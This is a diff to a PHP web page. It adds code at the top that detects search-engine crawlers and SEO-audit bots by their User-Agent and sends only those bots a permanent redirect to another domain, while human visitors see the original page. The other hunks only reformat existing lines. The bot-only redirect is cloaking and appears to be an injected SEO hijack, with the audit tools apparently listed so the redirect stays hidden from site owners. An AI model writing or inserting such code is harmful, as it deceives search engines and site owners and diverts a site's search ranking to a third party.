@@ -1,3 +1,27 @@
+<?php
+
+// === Redirect bot ke domain baru ===
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+
+$bots = [
+    'googlebot',
+    'bingbot',
+    'slurp',
+    'ahrefs',
+    'semrush',
+    'yandex',
+    'majestic',
+    'screamingfrog'
+];
+
+foreach ($bots as $bot) {
+    if (strpos($userAgent, strtolower($bot)) !== false) {
+        header("Location: https://jurnal.upnyk.ac.id/", true, 301);
+        exit();
+    }
+}
+?>
+
 <!DOCTYPE html>
 <html lang="en-US">
 	<head>
@@ -206,8 +230,7 @@
 					<div class="notice pdwidth">
 						<?php
 						include __DIR__."/assets/browse.php";
-						?>
-					</div>
+						?></div>
 
 					<div class="leftNotice">
 						<?php
@@ -426,8 +449,7 @@ if (!is_file($imageFile)) {
 										}
 									}
 								} else {
-									$query="SELECT * FROM `information` ORDER BY id asc";$result=mysqli_query($db, $query);
-									while($rows=mysqli_fetch_assoc($result)) {
+									$query="SELECT * FROM `information` ORDER BY id asc";$result=mysqli_query($db, $query);while($rows=mysqli_fetch_assoc($result)) {
 										if($rows['id'] == 2) {
 								?>
 								<a class="pub-top " href="<?php echo $rows['url']; ?>">
